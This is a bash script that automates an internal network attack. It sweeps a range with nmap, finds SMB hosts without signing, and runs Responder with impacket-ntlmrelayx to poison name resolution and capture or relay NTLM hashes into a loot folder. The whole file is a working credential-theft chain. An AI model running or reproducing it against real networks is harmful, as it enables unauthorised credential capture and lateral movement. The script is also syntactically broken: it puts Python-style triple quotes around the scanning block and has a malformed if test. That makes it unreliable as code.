#!/bin/bash
'''
mkdir -p output/nmap output/list

echo 'NMAP PE Scan'
nmap -PE -sn -n --max-retries 2 --max-hostgroup 20 --scan-delay 1 -oA output/pe $1 > /dev/null 2>&1
echo ''
echo 'Done'
awk '/Up/ {print$2}' output/pe.gnmap > output/ips.txt
echo ''
echo 'NMAP Portscan 445'
nmap -p 445 --max-retries 2 --max-hostgroup 20 --scan-delay 1 -oA output/445 -iL output/ips.txt > /dev/null 2>&1
echo ''
echo 'Done'
awk '/open/ {print$2}' output/445.gnmap > output/445_open.txt
echo ''
echo 'Generating Relay List'
crackmapexec smb output/445_open.txt --gen-relay-list output/smb_sign_off.txt > /dev/null 2>&1
echo 'Done'
'''
echo ''
echo 'Starting Responder'
timeout 300 /root/tools/Responder/Responder.py -I eth0 -rdwv > /dev/null 2>&1 &
echo ''
echo 'Done'
echo ''
echo 'Starting NTLM-Relay'
timeout 300 impacket-ntlmrelayx -l loot -of output/ntlm_relay_ntlmv2.txt --remove-mic -smb2support -tf output/smb_sign_off.txt > /dev/null 2>&1 &

echo ''
echo 'Waiting for Hashes'

PID_RESPONDER=`jobs -l | awk '/Responder/ {print$2}'`
PID_RELAY=`jobs -l | awk '/ntlmrelayx/ {print$2}'`
wait $PID_RESPONDER
wait $PID_RELAY

if [-s output/ntlm_relay_ntlmv2.txt]
	cat output/ntlm_relay_ntlmv2.txt

else
	echo 'No Hashes Found'
fi
